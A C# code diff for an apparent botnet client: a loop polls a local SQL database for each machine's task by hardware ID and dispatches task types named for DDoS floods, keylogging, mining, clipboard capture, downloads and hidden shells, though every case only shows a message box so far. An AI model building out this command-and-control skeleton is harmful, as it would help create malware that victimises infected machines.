@@ -117,11 +117,13 @@ namespace Bot
 
         private void loop(string HWID)
         {
-            int CTask = 0;
-            int TaskID;
             using (SqlConnection conn = new SqlConnection("Data Source=localhost;Initial Catalog=Kennedy;Integrated Security=True"))
             {
                 conn.Open();
+                int CTask;
+                int TaskID;
+                string Type;
+
                 do
                 {
                     using (SqlCommand cmd = new SqlCommand("SELECT CONVERT(datetime,GETDATE())", conn))
@@ -136,24 +138,89 @@ namespace Bot
                         cmd.ExecuteNonQuery();
                     }
 
-                    using (SqlCommand cmd = new SqlCommand("SELECT TaskID from Tasks;", conn))
+                    using (SqlCommand cmd = new SqlCommand("SELECT CTask from bots where HWID = @HWID;", conn))
+                    {
+                        cmd.Parameters.AddWithValue("HWID", HWID);
+                        CTask = Convert.ToInt32(cmd.ExecuteScalar());
+                    }
+
+                    using (SqlCommand cmd = new SqlCommand("SELECT TaskID from Tasks where HWID = @HWID;", conn))
                     {
                         cmd.Parameters.AddWithValue("HWID", HWID);
                         TaskID = Convert.ToInt32(cmd.ExecuteScalar());
                     }
 
-                    using (SqlCommand cmd = new SqlCommand("SELECT TaskID from Tasks;", conn))
+                    using (SqlCommand cmd = new SqlCommand("SELECT Type from Tasks where HWID = @HWID;", conn))
                     {
                         cmd.Parameters.AddWithValue("HWID", HWID);
-                        TaskID = Convert.ToInt32(cmd.ExecuteScalar());
+                        Type = cmd.ExecuteScalar().ToString();
                     }
 
                     if (CTask != TaskID)
                     {
+                        using (SqlCommand cmd = new SqlCommand("UPDATE bots SET CTask = @TaskID where HWID = @HWID", conn))
+                        {
+                            cmd.Parameters.AddWithValue("HWID", HWID);
+                            cmd.Parameters.AddWithValue("TaskID", TaskID);
+                            cmd.ExecuteNonQuery();
+                        }
 
+                        switch (Type)
+                        {
+                            case "clipboard":
+                                MessageBox.Show("Clipboard");
+                                break;
+                            case "http":
+                                MessageBox.Show("HTTP");
+                                break;
+                            case "syn":
+                                MessageBox.Show("Syn");
+                                break;
+                            case "udp":
+                                MessageBox.Show("UDP");
+                                break;
+                            case "download":
+                                MessageBox.Show("Download");
+                                break;
+                            case "firefox":
+                                MessageBox.Show("Firefox");
+                                break;
+                            case "homepage":
+                                MessageBox.Show("Homepage");
+                                break;
+                            case "keylogger":
+                                MessageBox.Show("Keylogger");
+                                break;
+                            case "mine":
+                                MessageBox.Show("Mine");    
+                                break;
+                            case "cleanse":
+                                MessageBox.Show("Cleanse");
+                                break;
+                            case "update":
+                                MessageBox.Show("Update");
+                                break;
+                            case "uninstall":
+                                MessageBox.Show("Uninstall");
+                                break;
+                            case "viewhidden":
+                                MessageBox.Show("ViewHidden");
+                                break;
+                            case "viewvisable":
+                                MessageBox.Show("ViewVisable");
+                                break;
+                            case "shellhidden":
+                                MessageBox.Show("ShellHidden");
+                                break;
+                            case "shellvisable":
+                                MessageBox.Show("ShellVisable");
+                                break;
+                            default:
+                                MessageBox.Show("You typed it wrong u fuck");
+                                break;
+                        }
                     }
-
-                    System.Threading.Thread.Sleep(5000);
+                System.Threading.Thread.Sleep(5000);
                 } while (true);
             }
         }
